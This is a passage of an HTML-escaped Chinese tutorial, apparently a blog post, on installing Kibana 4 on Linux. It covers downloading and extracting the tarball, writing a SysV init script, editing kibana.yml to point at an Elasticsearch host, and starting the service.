class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;wget https://download.elastic.co/kibana/kibana/kibana-4.5.1-linux-x64.tar.gz&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#解压&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;＃tar zxvf kibana-4.1.2-linux-x64.tar.gz -C /usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;＃&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt;  /usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/ &amp;amp;&amp;amp; mv kibana-4.1.2-linux-x64 kibana&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#创建kibana启动脚本服务&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;vi /etc/rc.d/init.d/kibana&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#!/bin/bash&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;### BEGIN INIT INFO&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Provides:          kibana&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Default-Start:     2 3 4 5&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Default-Stop:      0 1 6&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Short-Description: Runs kibana daemon&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Description: Runs the kibana daemon as a non-root user&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;### END INIT INFO&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Process name&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;NAME=kibana&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;DESC=&lt;span class=&quot;string&quot;&gt;&quot;Kibana4&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;PROG=&lt;span class=&quot;string&quot;&gt;&quot;/etc/init.d/kibana&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Configure location of Kibana bin&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;KIBANA_BIN=/usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/kibana/bin&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# PID Info&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;PID_FOLDER=/var/run/kibana/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;PID_FILE=/var/run/kibana/&lt;span class=&quot;variable&quot;&gt;$NAME&lt;/span&gt;.pid&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;LOCK_FILE=/var/lock/subsys/&lt;span class=&quot;variable&quot;&gt;$NAME&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;PATH=/bin:/usr/bin:/sbin:/usr/sbin:&lt;span class=&quot;variable&quot;&gt;$KIBANA_BIN&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;DAEMON=&lt;span class=&quot;variable&quot;&gt;$KIBANA_BIN&lt;/span&gt;/&lt;span class=&quot;variable&quot;&gt;$NAME&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Configure User to run daemon process&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;DAEMON_USER=root&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Configure logging location&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;KIBANA_LOG=/var/&lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt;/kibana.log&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Begin Script&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;RETVAL=0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; [ `id -u` &lt;span class=&quot;_&quot;&gt;-ne&lt;/span&gt; 0 ]; &lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;You need root privileges to run this script&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt; 1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;fi&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Function library&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;. /etc/init.d/&lt;span class=&quot;built_in&quot;&gt;functions&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;start&lt;/span&gt;&lt;/span&gt;() &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; -n &lt;span class=&quot;string&quot;&gt;&quot;Starting &lt;span class=&quot;variable&quot;&gt;$DESC&lt;/span&gt; : &quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;pid=`pidofproc -p &lt;span class=&quot;variable&quot;&gt;$PID_FILE&lt;/span&gt; kibana`&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; [ -n &lt;span class=&quot;string&quot;&gt;&quot;&lt;span class=&quot;variable&quot;&gt;$pid&lt;/span&gt;&quot;&lt;/span&gt; ] ; &lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Already running.&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt; 0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;# Start Daemon&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; [ ! &lt;span class=&quot;_&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;&lt;span class=&quot;variable&quot;&gt;$PID_FOLDER&lt;/span&gt;&quot;&lt;/span&gt; ] ; &lt;span class=&quot;keyword&quot;&gt;then&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                        mkdir &lt;span class=&quot;variable&quot;&gt;$PID_FOLDER&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;fi&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;daemon --user=&lt;span class=&quot;variable&quot;&gt;$DAEMON_USER&lt;/span&gt; --pidfile=&lt;span class=&quot;variable&quot;&gt;$PID_FILE&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$DAEMON&lt;/span&gt; 1&amp;gt;&lt;span class=&quot;string&quot;&gt;&quot;&lt;span class=&quot;variable&quot;&gt;$KIBANA_LOG&lt;/span&gt;&quot;&lt;/span&gt; 2&amp;gt;&amp;amp;1 &amp;amp;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                sleep 2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                pidofproc node &amp;gt; &lt;span class=&quot;variable&quot;&gt;$PID_FILE&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                RETVAL=$?&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                [[ $? &lt;span class=&quot;_&quot;&gt;-eq&lt;/span&gt; 0 ]] &amp;amp;&amp;amp; success || failure&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                [ &lt;span class=&quot;variable&quot;&gt;$RETVAL&lt;/span&gt; = 0 ] &amp;amp;&amp;amp; touch &lt;span class=&quot;variable&quot;&gt;$LOCK_FILE&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;                &lt;span class=&quot;built_in&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$RETVAL&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;fi&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;reload&lt;/span&gt;&lt;/span&gt;()&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Reload command is not implemented for this service.&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$RETVAL&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;title&quot;&gt;stop&lt;/span&gt;&lt;/span&gt;() &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; -n &lt;span class=&quot;string&quot;&gt;&quot;Stopping &lt;span class=&quot;variable&quot;&gt;$DESC&lt;/span&gt; : &quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        killproc -p &lt;span class=&quot;variable&quot;&gt;$PID_FILE&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$DAEMON&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        RETVAL=$?&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        [ &lt;span class=&quot;variable&quot;&gt;$RETVAL&lt;/span&gt; = 0 ] &amp;amp;&amp;amp; rm &lt;span class=&quot;_&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$PID_FILE&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$LOCK_FILE&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;&lt;span class=&quot;variable&quot;&gt;$1&lt;/span&gt;&quot;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  start)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        start&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  stop)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        stop&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        ;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  status)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        status -p &lt;span class=&quot;variable&quot;&gt;$PID_FILE&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$DAEMON&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        RETVAL=$?&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        ;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  restart)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        stop&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        start&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        ;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  reload)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;reload&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  *)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Invalid Arguments, print the following message.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Usage: &lt;span class=&quot;variable&quot;&gt;$0&lt;/span&gt; &amp;#123;start|stop|status|restart&amp;#125;&quot;&lt;/span&gt; &amp;gt;&amp;amp;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt; 2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        ;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;esac&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;修改启动权限&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;chmod +x /etc/rc.d/init.d/kibana&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;配置Kibana：&lt;/p&gt;
&lt;h3 id=&quot;编辑kibana-yaml-修改端口，设置host-可以设置本地服务器IP&quot;&gt;&lt;a href=&quot;#编辑kibana-yaml-修改端口，设置host-可以设置本地服务器IP&quot; class=&quot;headerlink&quot; title=&quot;编辑kibana.yaml  修改端口，设置host 可以设置本地服务器IP&quot;&gt;&lt;/a&gt;编辑kibana.yaml  修改端口，设置host 可以设置本地服务器IP&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;49&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;50&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;51&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;52&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;53&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;54&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;55&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;56&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;57&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;vim /usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/kibana/config/kibana.yml&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Kibana is served by a back end server. This controls which port to use.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;server.port: 5601&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# The host to bind the server to.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;server.host: &lt;span class=&quot;string&quot;&gt;&quot;10.47.88.188&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# If you are running kibana behind a proxy, and want to mount it at a path,&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# specify that path here. The basePath can&#39;t end in a slash.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# server.basePath: &quot;&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# The maximum payload size in bytes on incoming server requests.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# server.maxPayloadBytes: 1048576&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# The Elasticsearch instance to use for all your queries.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;elasticsearch.url: &lt;span class=&quot;string&quot;&gt;&quot;http://10.47.88.188:9200&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# preserve_elasticsearch_host true will send the hostname specified in `elasticsearch`. If you set it to false,&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# then the host you use to connect to *this* Kibana instance will be sent.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;elasticsearch.preserveHost: &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Kibana uses an index in Elasticsearch to store saved searches, visualizations&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# and dashboards. It will create a new index if it doesn&#39;t already exist.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# kibana.index: &quot;.kibana&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# The default application to load.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;kibana.defaultAppId: &lt;span class=&quot;string&quot;&gt;&quot;discover&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# If your Elasticsearch is protected with basic auth, these are the user credentials&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# used by the Kibana server to perform maintenance on the kibana_index at startup. Your Kibana&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# users will still need to authenticate with Elasticsearch (which is proxied through&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# the Kibana server)&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# elasticsearch.ssl.key: /path/to/your/client.key&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# If you need to provide a CA certificate for your Elasticsearch instance, put&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# the path of the pem file here.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# elasticsearch.ssl.ca: /path/to/your/CA.pem&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Set to false to have a complete disregard for the validity of the SSL&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# certificate.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# elasticsearch.ssl.verify: true&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Time in milliseconds to wait for elasticsearch to respond to pings, defaults to&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# request_timeout setting&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# elasticsearch.pingTimeout: 1500&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Time in milliseconds to wait for responses from the back end or elasticsearch.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# This must be &amp;gt; 0&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;elasticsearch.requestTimeout: 30000&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Time in milliseconds for Elasticsearch to wait for responses from shards.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Set to 0 to disable.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# elasticsearch.shardTimeout: 0&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;启动kibana服务&quot;&gt;&lt;a href=&quot;#启动kibana服务&quot; class=&quot;headerlink&quot; title=&quot;启动kibana服务&quot;&gt;&lt;/a&gt;启动kibana服务&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;service kibana start&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;service kibana status&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;查看端口&quot;&gt;&lt;a href=&quot;#查看端口&quot; class=&quot;headerlink&quot; title=&quot;查看端口&quot;&gt;&lt;/a&gt;查看端口&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;netstat -nltp&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@es_02 config]&lt;span class=&quot;comment&quot;&gt;# netstat 